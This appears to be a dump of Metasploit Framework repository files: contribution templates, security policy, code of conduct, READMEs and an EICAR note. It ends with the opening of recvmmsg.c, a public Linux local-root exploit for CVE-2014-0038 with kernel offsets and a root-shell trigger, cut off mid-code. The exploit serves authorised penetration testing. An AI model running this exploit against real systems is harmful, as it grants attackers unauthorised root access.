{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/ISSUE_TEMPLATE/bug_report.md", "content": "---\nname: Bug Report \ud83d\udc1e\nabout: Something isn't working as expected? Here is the right place to report.\nlabels: \"bug\"\n---\n\n<!--\n  Please fill out each section below, otherwise, your issue will be closed. This info allows Metasploit maintainers to diagnose (and fix!) your issue as quickly as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n  - Reporting a Bug: https://docs.metasploit.com/docs/using-metasploit/getting-started/reporting-a-bug.html\n\n  Before opening a new issue, please search existing issues: https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Steps to reproduce\n\nHow'd you do it?\n\n1. ...\n2. ...\n\nThis section should also tell us any relevant information about the\nenvironment; for example, if an exploit that used to work is failing,\ntell us the victim operating system and service versions.\n\n## Were you following a specific guide/tutorial or reading documentation?\n\nIf yes link the guide/tutorial or documentation you were following here, otherwise you may omit this section.\n\n## Expected behavior\n\nWhat should happen?\n\n## Current behavior\n\nWhat happens instead?\n\n### Metasploit version\n\nGet this with the `version` command in msfconsole (or `git log -1 --pretty=oneline` for a source install).\n\n## Additional Information\nIf your version is less than `5.0.96`, please update to the latest version and ensure your issue is still present.\n\nIf the issue is encountered within `msfconsole`, please run the `debug` command using the instructions below. If the issue is encountered outisde `msfconsole`, or the issue causes `msfconsole` to crash on startup, please delete this section.\n\n1. Start `msfconsole`\n2. Run the command `set loglevel 3`\n3. Take the steps necessary recreate your issue\n4. Run the `debug` command\n5. Copy all the output below the `===8<=== CUT AND PASTE EVERYTHING BELOW THIS LINE ===8<===` line and make sure to **REMOVE ANY SENSITIVE INFORMATION.**\n6. Replace these instructions and the paragraph above with the output from step 5.\n", "timestamp": "2025-10-24T23:39:23.946298"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/ISSUE_TEMPLATE/documentation.md", "content": "---\nname: Documentation \ud83d\udcdd\nabout: Suggest better docs coverage for a particular tool or process.\nlabels: \"suggestion-docs\"\n---\n\n<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nWhat problem(s) did you run into that caused you to request additional documentation? What questions do you think we should answer? What, if any, existing documentation relates to this proposal?\n\nSome recommended topics to cover:\n\n- List the topics you think should be here.\n- This list does not need to be exhaustive!\n\n### Motivation\n\nWhy should we document this and who will benefit from it?\n\n## Steps to resolve this issue\n\n<!-- Your suggestion may require additional steps. Remember to add any relevant labels. Note that you'll need to fill in the link to a similar article as well as the correct section. Don't worry if you're not yet sure about these, especially if this is a brand new topic! -->\n\n### Draft the doc\n\n- [ ] Write the doc, following the format listed in these resources:\n  - [Overview on contributing module documentation](https://docs.metasploit.com/docs/development/quality/writing-module-documentation.html)\n  - [Docs Templates](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md)\n  - [Example of a similar article]()\n\n### Open a pull request\n\n- [ ] Open a pull request with your work including the words \"closes #[this issue's number]\" in the pull request description\n", "timestamp": "2025-10-24T23:39:24.266136"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/ISSUE_TEMPLATE/feature_suggestion.md", "content": "---\nname: Feature Suggestion \ud83d\udca1\nabout: Suggest a new idea for the project.\nlabels: \"suggestion-feature\"\n---\n\n<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nBrief explanation of the feature.\n\n### Basic example\n\nIf the proposal involves a new or changed API, include a basic code example. Omit this section if it's not applicable.\n\n### Motivation\n\nWhy are we doing this? What use cases does it support? What is the expected outcome?\n", "timestamp": "2025-10-24T23:39:24.597410"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/ISSUE_TEMPLATE/module_suggestion.md", "content": "---\nname: Module Suggestion \ud83d\udce6\nabout: Suggest a new module idea to include in framework.\nlabels: \"suggestion-module\"\n---\n\n<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\nBrief explanation of the module.\n\n### Basic example\n\nIf you have a POC, blog post or any other useful references please let us know in this section.\n\n### Motivation\n\nWhy are we doing this? What use cases does it support? What is the expected outcome?\n", "timestamp": "2025-10-24T23:39:24.918469"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/ISSUE_TEMPLATE/question.md", "content": "---\nname: Question \ud83e\udd14\nabout: Usage question or discussion about Metasploit.\nlabels: \"question\"\n---\n\n<!--\n  To make it easier for us to help you, please include as much useful information as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n\n  Before opening a new issue, please search existing issues https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Summary\n\n## Relevant information\n\n<!-- Provide as much useful information as you can -->\n", "timestamp": "2025-10-24T23:39:25.248004"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/PULL_REQUEST_TEMPLATE.md", "content": "Tell us what this change does. If you're fixing a bug, please mention\nthe github issue number.\n\nPlease ensure you are submitting **from a unique branch** in your [repository](https://github.com/rapid7/metasploit-framework/pull/11086#issuecomment-445506416) to master in Rapid7's.\n\n## Verification\n\nList the steps needed to make sure this thing works\n\n- [ ] Start `msfconsole`\n- [ ] `use exploit/windows/smb/ms08_067_netapi`\n- [ ] ...\n- [ ] **Verify** the thing does what it should\n- [ ] **Verify** the thing does not do what it should not\n- [ ] **Document** the thing and how it works ([Example](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/gather/aws_keys.md))\n\nIf you are opening a PR for a new module that exploits a **specific** piece of hardware or requires a **complex or hard-to-find** testing environment, we recommend that you send us a demo of your module executing correctly. Seeing your module in action will help us review your PR faster!\n\nSpecific Hardware Examples:\n* Switches\n* Routers\n* IP Cameras\n* IoT devices\n\nComplex Software Examples:\n* Expensive proprietary software\n* Software with an extensive installation process\n* Software that requires exploit testing across multiple significantly different versions\n* Software without an English language UI\n\nWe will also accept demonstrations of successful module execution even if your module doesn't meet the above conditions. It's not a necessity, but it may help us land your module faster!\n\nDemonstration of successful module execution can take the form of a packet capture (pcap) or a screen recording. You can send pcaps and recordings to [msfdev@metasploit.com](mailto:msfdev@metasploit.com). Please include a CVE number in the subject header (if applicable), and a link to your PR in the email body.\nIf you wish to sanitize your pcap, please see the [wiki](https://docs.metasploit.com/docs/development/get-started/sanitizing-pcaps.html).\n", "timestamp": "2025-10-24T23:39:25.550967"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": ".github/SECURITY.md", "content": "# Reporting security issues\n\nThanks for your interest in making Metasploit more secure! If you feel\nthat you have found a security issue involving Metasploit, Meterpreter,\nRecog, or any other Rapid7 open source project, you are welcome to let\nus know in the way that's most comfortable for you.\n\n## Via ZenDesk\n\nYou can click on the big orange button at [Rapid7's Vulnerability\nDisclosure][r7-vulns] page, which will get you to our general\nvulnerability reporting system. While this does require a (free) ZenDesk\naccount to use, you'll get regular updates on your issue as our software\nsupport teams work through it. As it happens [that page][r7-vulns] also\nwill tell you what to expect when it comes to reporting vulns, how fast\nwe'll fix and respond, and all the rest, so it's a pretty good read\nregardless.\n\n## Via email\n\nIf you're more of a traditionalist, you can email your finding to\nsecurity@rapid7.com. If you like, you can use our [PGP key][pgp] to\nencrypt your messages, but we certainly don't mind cleartext reports\nover email.\n\n## NOT via GitHub Issues\n\nPlease don't! Disclosing security vulnerabilities to public bug trackers\nis kind of mean, even when it's well-intentioned, since you end up\ndropping 0-day on pretty much everyone right out of the gate. We'd prefer\nyou didn't!\n\n[r7-vulns]:https://www.rapid7.com/security/disclosure/\n[pgp]:https://keybase.io/rapid7/pgp_keys.asc?fingerprint=9a90aea0576cbcafa39c502ba5e16807959d3eda\n\n", "timestamp": "2025-10-24T23:39:25.899890"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "CODE_OF_CONDUCT.md", "content": "# Contributor Code of Conduct\n\nAs contributors and maintainers of this project, and in the interest of\nfostering an open and welcoming community, we pledge to respect all people who\ncontribute through reporting issues, posting feature requests, updating\ndocumentation, submitting pull requests or patches, and other activities.\n\nWe are committed to making participation in this project a harassment-free\nexperience for everyone, regardless of level of experience, gender, gender\nidentity and expression, sexual orientation, disability, personal appearance,\nbody size, race, ethnicity, age, religion, or nationality.\n\nExamples of unacceptable behavior by participants include:\n\n* The use of sexualized language or imagery\n* Personal attacks\n* Trolling or insulting/derogatory comments\n* Public or private harassment\n* Publishing other's private information, such as physical or electronic\n  addresses, without explicit permission\n* Other unethical or unprofessional conduct\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\nBy adopting this Code of Conduct, project maintainers commit themselves to\nfairly and consistently applying these principles to every aspect of managing\nthis project. Project maintainers who do not follow or enforce the Code of\nConduct may be permanently removed from the project team.\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community.\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project maintainers at msfdev@metasploit.com. If\nthe incident involves a committer, you may report it directly to\nsmcintyre@metasploit.com or jacquelyn_harris@rapid7.com.\n\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nMaintainers are obligated to maintain confidentiality with regard to the\nreporter of an incident.\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage],\nversion 1.3.0, available at\n[http://contributor-covenant.org/version/1/3/0/][version]\n\n[homepage]: http://contributor-covenant.org\n[version]: http://contributor-covenant.org/version/1/3/0/\n", "timestamp": "2025-10-24T23:39:26.230542"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "CONTRIBUTING.md", "content": "# Contributing to Metasploit\nThank you for your interest in making Metasploit -- and therefore, the\nworld -- a better place!  Before you get started, please review our [Code of Conduct](./CODE_OF_CONDUCT.md). This helps us ensure our community is positive and supportive for everyone involved.\n\n## Code Free Contributions\nBefore we get into the details of contributing code, you should know there are multiple ways you can add to Metasploit without any coding experience:\n\n - You can [submit bugs and feature requests](https://github.com/rapid7/metasploit-framework/issues/new/choose) with detailed information about your issue or idea:\n \t- If you'd like to propose a feature, describe what you'd like to see. Mock ups of console views would be great.\n \t- If you're reporting a bug, please be sure to include the expected behaviour, the observed behaviour, and steps to reproduce the problem. Resource scripts, console copy-pastes, and any background on the environment you encountered the bug in would be appreciated. More information can be found [below](#bug-reports).\n - [Help fellow users with open issues]. This can require technical knowledge, but you can also get involved in conversations about bug reports and feature requests. This is a great way to get involved without getting too overwhelmed!\n - [Help fellow committers test recently submitted pull requests](https://github.com/rapid7/metasploit-framework/pulls). Again this can require some technical skill, but by pulling down a pull request and testing it, you can help ensure our new code contributions for stability and quality.\n - [Report a security vulnerability in Metasploit itself] to Rapid7. If you see something you think makes Metasploit vulnerable to an attack, let us know!\n - Add [module documentation]. New documentation is always needed and cleaning up existing documents is just as important! If you're a non-native English speaker, you can help by replacing any ambiguous idioms, metaphors, or unclear language that might make our documentation hard to understand.\n\n\n## Code Contributions\nFor those of you who are looking to add code to Metasploit, your first step is to set up a [development environment]. Once that's done, we recommend beginners start by adding a [proof-of-concept exploit from ExploitDB,](https://www.exploit-db.com/search?verified=true&hasapp=true&nomsf=true) as a new module to the Metasploit framework. These exploits have been verified as recreatable and their ExploitDB page includes a copy of the exploitable software. This makes testing your module locally much simpler, and most importantly the exploits don't have an existing Metasploit implementation. ExploitDB can be slow to update however, so please double check that there isn't an existing module before beginning development! If you're certain the exploit you've chosen isn't already in Metasploit, read our [writing an exploit guide](https://docs.metasploit.com/docs/development/developing-modules/guides/get-started-writing-an-exploit.html). It will help you to get started and avoid some common mistakes.\n\nOnce you have finished your new module and tested it locally to ensure it's working as expected, check out our [guide for accepting modules](https://docs.metasploit.com/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html#module-additions). This will give you a good idea of how to clean up your code so that it's likely to get accepted.\n\nFinally, follow our short list of do's and don'ts below to make sure your valuable contributions actually make it into Metasploit's master branch! We try to consider all our pull requests fairly and in detail, but if you do not follow these rules, your contribution\nwill be closed. We need to ensure the code we're adding to master is written to a high standard.\n\n## Expedited Module Creation Process\nWe strive to respect the community that has given us so much, so in the odd situation where we get multiple submissions for the same vulnerability, generally we will work with the first person who assigns themselves to the issue or the first person that submits a good-faith PR.  A good-faith PR might not even work, but it will show that the author is working their way toward a solution.  Despite this general rule, there are rare circumstances where we may ask a contributor to step aside or allow a committer to take the lead on the creation of a new module if a complete and working module with documents has not already been submitted.  This kind of expedited module creation process comes up infrequently, and usually it involves high-profile or high priority modules that we have marked internally as time-critical: think KEV list, active exploitation campaigns, CISA announcements, etc.  In those cases, we may ask a contributor that is assigned to the issue or who has submitted an incomplete module to allow a committer to take over an issue or a module PR in the interest of getting a module out quickly.  If a contributor has submitted an incomplete module, they will remain as a co-author of the module and we may build directly onto the PR they submitted, leaving the original commits in the tree.  We sincerely hope that the original author will remain involved in this expedited module creation process.  We would appreciate testing, critiquing, and any assistance that can be offered.  If the module is complete but requires minor changes, we may ask the contributor to allow us to take over testing/verification and make these minor changes without asking so we can land the module as quickly as possible.  In these cases of minor code changes, the authorship of the module will remain unchanged.  We hope everyone involved in this expedited module creation process continues to feel valued and appreciated.\n\n## Vibecoding, AI, and LLM\nMy first job had a token ring LAN and I still own a Win98SE CD, so I'm not entirely sure what _vibecoding_ is, but we're cool with any coding technique you use to create a PR as long as it is tested, documented, and does what it says it does.  Untested code is incomplete code, and incomplete code should be marked as a draft PR or WIP (Work in Progress) until it is complete, tested, and ready for a committer to review.  We have had several submissions clearly from AI that were well-formatted, looked really neat, and did nothing it said it did.  While we have no problem with AI-assisted coding, please do not assume that the code generated by an AI or LLM is logically or even syntactically correct.\n\n### Code Contribution Do's & Don'ts:\nKeeping the following in mind gives your contribution the best chance of landing!\n\n#### <u>Pull Requests</u>\n**Pull request [PR#9966] is a good example to follow.**\n\n* **Do** create a [topic branch] to work on instead of working directly on `master`. This helps to:\n\t*  Protect the process.\n\t* Ensures users are aware of commits on the branch being considered for merge.\n\t* Allows for a location for more commits to be offered without mingling with other contributor changes.\n\t* Allows contributors to make progress while a PR is still being reviewed.\n* **Do** follow the [50/72 rule] for Git commit messages.\n* **Do** write \"WIP\" on your PR and/or open a [draft PR] if submitting **working** yet unfinished code.\n* **Do** target your pull request to the **master branch**.\n* **Do** specify a descriptive title to make searching for your pull request easier.\n* **Do** include [console output], especially for effects that can be witnessed in the  `msfconsole`.\n* **Do** test your code and submit the test output in your PR with any sensitive information removed.\n* **Do** list [verification steps] so committers can test your code.\n* **Do** [reference associated issues] in your pull request description.\n* **Don't** leave your pull request description blank.\n* **Don't** include sensitive information in your PR (including externally-routable IP addresses in documentation).\n* **Don't** PR untested/unvalidated code you copy/pasted from the internet.\n* **Don't** PR untested/unvalidated code you copy/pasted from AI or LLM.\n* **Don't** abandon your pull request. Being responsive helps us land your code faster.\n* **Don't** post questions in older closed PRs.\n\n#### <u>New Modules</u>\n* **Do** check the issue tracker to see if there is a `suggestion-module` issue for the module you want to write, and assign yourself to it if there is.\n* **Do** license your code as BSD 3-clause, BSD 2-clause, or MIT.\n* **Do** stick to the [Ruby style guide] and use [Rubocop] to find common style issues.\n* **Do** set up `msftidy` to fix any errors or warnings that come up as a [pre-commit hook].\n* **Do** use the many module mixin [API]s.\n* **Do** include instructions on how to setup the vulnerable environment or software.\n* **Do** include [Module Documentation] showing sample run-throughs.\n* **Do** ask cve@rapid7.com for a CVE ID if this describes a new vulnerability (remember to mention your PR number!)\n* **Don't** include more than one module per pull request.\n* **Don't** submit new [scripts].  Scripts are shipped as examples for automating local tasks, and anything \"serious\" can be done with post modules and local exploits.\n\n#### <u>Library Code</u>\n* **Do** write [RSpec] tests - even the smallest change in a library can break existing code.\n* **Do** follow [Better Specs] - it's like the style guide for specs.\n* **Do** write [YARD] documentation - this makes it easier for people to use your code.\n* **Don't** fix a lot of things in one pull request. Small fixes are easier to validate.\n\n#### <u>Bug Fixes</u>\n* **Do** include reproduction steps in the form of verification steps.\n* **Do** link to any corresponding [Issues] in the format of `See #1234` in your commit description.\n\n## Bug Reports\n\nPlease report vulnerabilities in Rapid7 software directly to security@rapid7.com. For more on our disclosure policy and Rapid7's approach to coordinated disclosure, [head over here](https://www.rapid7.com/security).\n\nWhen reporting Metasploit issues:\n* **Do** write a detailed description of your bug and use a descriptive title.\n* **Do** include reproduction steps, stack traces, and anything that might help us fix your bug.\n* **Don't** file duplicate reports; search for your bug before filing a new report.\n* **Don't** attempt to report issues on a closed PR.\n\nIf you need some more guidance, talk to the main body of open source contributors over on our\n[GitHub Discussions](https://github.com/rapid7/metasploit-framework/discussions) or [Metasploit Slack]\n\nFinally, **thank you** for taking the few moments to read this far! You're already way ahead of the\ncurve, so keep it up!\n\n[Code of Conduct]:https://docs.metasploit.com/docs/code-of-conduct.html\n[Submit bugs and feature requests]:http://r-7.co/MSF-BUGv1\n[Help fellow users with open issues]:https://github.com/rapid7/metasploit-framework/issues\n[help fellow committers test recently submitted pull requests]:https://github.com/rapid7/metasploit-framework/pulls\n[Report a security vulnerability in Metasploit itself]:https://www.rapid7.com/disclosure.jsp\n[development environment]:http://r-7.co/MSF-DEV\n[proof-of-concept exploits]:https://www.exploit-db.com/search?verified=true&hasapp=true&nomsf=true\n[Ruby style guide]:https://github.com/bbatsov/ruby-style-guide\n[Rubocop]:https://rubygems.org/search?query=rubocop\n[50/72 rule]:http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html\n[topic branch]:http://git-scm.com/book/en/Git-Branching-Branching-Workflows#Topic-Branches\n[draft PR]:https://help.github.com/en/articles/about-pull-requests#draft-pull-requests\n[console output]:https://docs.github.com/en/free-pro-team@latest/github/writing-on-github/creating-and-highlighting-code-blocks#fenced-code-blocks\n[verification steps]:https://docs.github.com/en/free-pro-team@latest/github/writing-on-github/basic-writing-and-formatting-syntax#task-lists\n[reference associated issues]:https://github.com/blog/1506-closing-issues-via-pull-requests\n[PR#9966]:https://github.com/rapid7/metasploit-framework/pull/9966\n[pre-commit hook]:https://github.com/rapid7/metasploit-framework/blob/master/tools/dev/pre-commit-hook.rb\n[API]:https://rapid7.github.io/metasploit-framework/api\n[module documentation]:https://docs.metasploit.com/docs/using-metasploit/basics/module-documentation.html\n[scripts]:https://github.com/rapid7/metasploit-framework/tree/master/scripts\n[RSpec]:http://rspec.info\n[Better Specs]:http://www.betterspecs.org/\n[YARD]:http://yardoc.org\n[Issues]:https://github.com/rapid7/metasploit-framework/issues\n[Metasploit Slack]:https://www.metasploit.com/slack\n[#metasploit on Freenode IRC]:http://webchat.freenode.net/?channels=%23metasploit&uio=d4\n", "timestamp": "2025-10-24T23:39:26.550848"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "CURRENT.md", "content": "Active Metasploit 5 development will sometimes push aggressive changes.\nIntegrations with 3rd-party tools, as well as general usage, may change quickly\nfrom day to day. Some of the steps for dealing with major changes will be\ndocumented here. We will continue to maintain the Metasploit 4.x branch until\nMetasploit 5.0 is released.\n\n**2018/01/17 - [internal] module cache reworked to not store metadata in PostgreSQL**\n\nMetasploit no longer stores module metadata in a PostgreSQL database, instead\nstoring it in a cache file in your local ~/.msf4 config directory. This has a\nnumber of advantages:\n\n * Fast searches whether you have the database enabled or not (no more slow search mode)\n * Faster load time for msfconsole, the cache loads more quickly\n * Private module data is not uploaded to a shared database, no collisions\n * Adding or deleting modules no longer displays file-not-found error messages on start in msfconsole\n * Reduced memory consumption\n\nCode that reads directly from the Metasploit database for module data will need\nto use the new module search API.\n", "timestamp": "2025-10-24T23:39:26.876282"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "README.md", "content": "# Metasploit Framework\n\nThe Metasploit Framework is an open-source tool released under a BSD-style license. For detailed licensing information, refer to the `COPYING` file.\n\n## Latest Version\nAccess the latest version of Metasploit from the [Nightly Installers](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html) page.\n\n## Documentation\nComprehensive documentation, including usage guides, is available at [Metasploit Docs](https://docs.metasploit.com/).\n\n## Development Environment\nTo set up a development environment, visit the [Development Setup Guide](https://docs.metasploit.com/docs/development/get-started/setting-up-a-metasploit-development-environment.html).\n\n## Bug and Feature Requests\nSubmit bugs and feature requests via the [GitHub Issues](https://github.com/rapid7/metasploit-framework/issues) tracker. New submissions can be made through the [MSF-BUGv1 form](https://github.com/rapid7/metasploit-framework/issues/new/choose).\n\n## API Documentation\nFor information on writing modules, refer to the [API Documentation](https://docs.metasploit.com/api/).\n\n## Support and Communication\nFor questions and suggestions, you can:\n\n- Join our [GitHub Discussions](https://github.com/rapid7/metasploit-framework/discussions) for community support and general questions\n- Join the [Metasploit Slack](https://join.slack.com/t/metasploit/shared_invite/zt-30i688it0-mJsFGT44IMtdeZi1DraamQ) for real-time chat\n- Submit [GitHub Issues](https://github.com/rapid7/metasploit-framework/issues) for bug reports and feature requests\n- Follow [@metasploit](https://x.com/metasploit) on X or [@metasploit@infosec.exchange](https://infosec.exchange/@metasploit) on Mastodon for updates\n\n**Note:** Some community members may still use IRC channels and the metasploit-hackers mailing list, though the primary support channels are now GitHub Discussions and Slack.\n\n## Installing Metasploit\n\n### Recommended Installation\n\nWe recommend installation with the [official Metasploit installers](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos) on Linux or macOS. Metasploit is also pre-installed with Kali.\n\nFor a manual setup, consult the [Dev Environment Setup](https://docs.metasploit.com/docs/development/get-started/setting-up-a-metasploit-development-environment.html) guide.\n\n## Using Metasploit\n\nTo get started with Metasploit:\n\n1. **Start `msfconsole`:** This is the primary interface for interacting with Metasploit.\n2. **Explore Resources:** \n   - Visit the [Using Metasploit](https://docs.metasploit.com/docs/using-metasploit/getting-started/index.html) section of the documentation.\n\n## Contributing\n\nTo contribute to Metasploit:\n\n1. **Setup Development Environment:** Follow the instructions in the [Development Setup Guide](https://docs.metasploit.com/docs/development/get-started/setting-up-a-metasploit-development-environment.html) on GitHub.\n2. **Clone the Repository:** Obtain the source code from the official repository.\n3. **Submit a Pull Request:** After making changes, submit a pull request for review. Additional details can be found in the [Contributing Guide](https://github.com/rapid7/metasploit-framework/blob/master/CONTRIBUTING.md).\n", "timestamp": "2025-10-24T23:39:27.197204"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "config/README.md", "content": "Contains various files that help configure Metasploit. Most files here you'll never have to deal with, though\n`database.yml.example` might be useful for those looking to configure their database, and `openssl.conf`\nmight be helpful for those trying to troubleshoot OpenSSL issues in Metasploit.", "timestamp": "2025-10-24T23:39:27.830801"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/README.md", "content": "This folder contains various data files used for a variety of purposes, including but not limited to banners for the\nconsole, exploit source code for exploits (under `data/exploits`), template code and binaries, wordlists and shellcode.\n\nAs a general rule of thumb this folder will most often be used when you are using compiled binaries or source code from\nother exploits for cases such as local privilege escalation exploits and need to provide the exploit code and compiled\nbinaries so that maintainers can verify the binary and compile it themselves, as so that modules can find the R7 compiled\nversion of the resulting binary for use during exploitation.", "timestamp": "2025-10-24T23:39:28.133633"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/cmd_exec/README.md", "content": "## Setup\n\nThis contains setup steps used for acceptance testing of the `cmd_exec` API. We will make use of the gcc docker image to\nbuild out the C binaries to then be uploaded to the host machine, so they can be used as part of the `cmd_exec`\ncreate process API.\n\nThis directory contains:\n- C executable `show_args.c`\n  This file is used as part of the `cmd_exec` testing as it requires a file to take args, then loop over them and output\n  those args back to the user.\n\n- Makefile to build the binaries `makefile.mk`\n  This file is used to create the binaries for both Windows and Linux that the docker command below will make use of.\n  This will output the following binaries:\n\n  - Precompiled binary for Windows\n    - `show_args.exe`\n\n  - Precompiled binary for Linux and Mettle\n    - `show_args`\n\n### Note\n\nYou will need to compile the OSX payload separately on an OSX machine, Docker is not supported. The test assume the file\nwill be named as `show_args_macos`.\n\n\n## Compile binaries locally\n\nWe make use of gcc for this: https://hub.docker.com/_/gcc\n\n- Run:\n```shell\ndocker run --rm -v \"$PWD\":/usr/src/myapp -w /usr/src/myapp gcc:11.4.0 /bin/bash -c \"apt update && apt install -y gcc-mingw-w64 && make all -f makefile.mk\"\n```\n", "timestamp": "2025-10-24T23:39:28.451072"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/eicar.txt", "content": "The eicar.com file in this directory is NOT A VIRUS. Instead, it is the industry standard\nanti-virus/anti-malware test file. We have included this file in the source tree of the \nMetasploit Framework so that the installed copy of Metasploit may determine whether or\nnot an installed anti-virus program is interfering with the operation of Metasploit.\n\nA number of files within the Metasploit Framework source tree are often flagged by\nanti-virus and anti-malware programs. All of these files are completely safe to the user\noperating the framework. However, when anti-virus programs try to quarantine these files\nthey often leave the framework in a broken state, leading to a poor user experience.\n\nThe EICAR file is used as a canary to determine whether an anti-virus program is\nresponsible for corrupting the Metasploit Framework installation.\n\nFor more information about EICAR, please see the following web site:\n\nhttps://www.eicar.org/download-anti-malware-testfile/\n", "timestamp": "2025-10-24T23:39:29.096330"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2014-0038/recvmmsg.c", "content": "/* \n*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\nrecvmmsg.c - linux 3.4+ local root (CONFIG_X86_X32=y)\nCVE-2014-0038 / x32 ABI with recvmmsg\nby rebel @ irc.smashthestack.org\n-----------------------------------\n\ntakes about 13 minutes to run because timeout->tv_sec is decremented\nonce per second and 0xff*3 is 765.\n\nsome things you could do while waiting:\n  * watch http://www.youtube.com/watch?v=OPyZGCKu2wg 3 times\n  * read https://wiki.ubuntu.com/Security/Features and smirk a few times\n  * brew some coffee\n  * stare at the countdown giggly with anticipation\n\ncould probably whack the high bits of some pointer with nanoseconds,\nbut that would require a bunch of nulls before the pointer and then\nreading an oops from dmesg which isn't that elegant.\n\n&net_sysctl_root.permissions is nice because it has 16 trailing nullbytes\n\nhardcoded offsets because I only saw this on ubuntu & kallsyms is protected\nanyway..\n\nsame principle will work on 32bit but I didn't really find any major\ndistros shipping with CONFIG_X86_X32=y\n\nuser@ubuntu:~$ uname -a\nLinux ubuntu 3.11.0-15-generic #23-Ubuntu SMP Mon Dec 9 18:17:04 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux\nuser@ubuntu:~$ gcc recvmmsg.c -o recvmmsg\nuser@ubuntu:~$ ./recvmmsg\nbyte 3 / 3.. ~0 secs left.     \nw00p w00p!\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# sh phalanx-2.6b-x86_64.sh\nunpacking..\n\n:)=\n\ngreets to my homeboys kaliman, beist, capsl & all of #social\n\nSat Feb  1 22:15:19 CET 2014\n% rebel %\n*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n*/\n\n#define _GNU_SOURCE\n#include <netinet/ip.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/utsname.h>\n\n#define __X32_SYSCALL_BIT 0x40000000\n#undef __NR_recvmmsg\n#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)\n#define VLEN 1\n#define BUFSIZE 200\n\nint port;\n\nstruct offset {\n    char *kernel_version;\n    unsigned long dest; // net_sysctl_root + 96\n    unsigned long original_value; // net_ctl_permissions\n    unsigned long prepare_kernel_cred;\n    unsigned long commit_creds;\n};\n\nstruct offset offsets[] = {\n    {\"3.11.0-15-generic\",0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10\n    {\"3.11.0-12-generic\",0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10\n    {\"3.8.0-19-generic\",0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04\n    {NULL,0,0,0,0}\n};\n\nvoid udp(int b) {\n    int sockfd;\n    struct sockaddr_in servaddr,cliaddr;\n    int s = 0xff+1;\n\n    if(fork() == 0) {\n        while(s > 0) {\n            fprintf(stderr,\"\\rbyte %d / 3.. ~%d secs left    \\b\\b\\b\\b\",b+1,3*0xff - b*0xff - (0xff+1-s));\n            sleep(1);\n            s--;\n            fprintf(stderr,\".\");\n        }\n\n        sockfd = socket(AF_INET,SOCK_DGRAM,0);\n        bzero(&servaddr,sizeof(servaddr));\n        servaddr.sin_family = AF_INET;\n        servaddr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);\n        servaddr.sin_port=htons(port);\n        sendto(sockfd,\"1\",1,0,(struct sockaddr *)&servaddr,sizeof(servaddr));\n        exit(0);\n    }\n\n}\n\nvoid trigger() {\n    open(\"/proc/sys/net/core/somaxconn\",O_RDONLY);\n\n    if(getuid() != 0) {\n        fprintf(stderr,\"not root, ya blew it!\\n\");\n        exit(-1);\n    }\n\n    fprintf(stderr,\"w00p w00p!\\n\");\n    system(\"/bin/sh -i\");\n}\n\ntypedef int 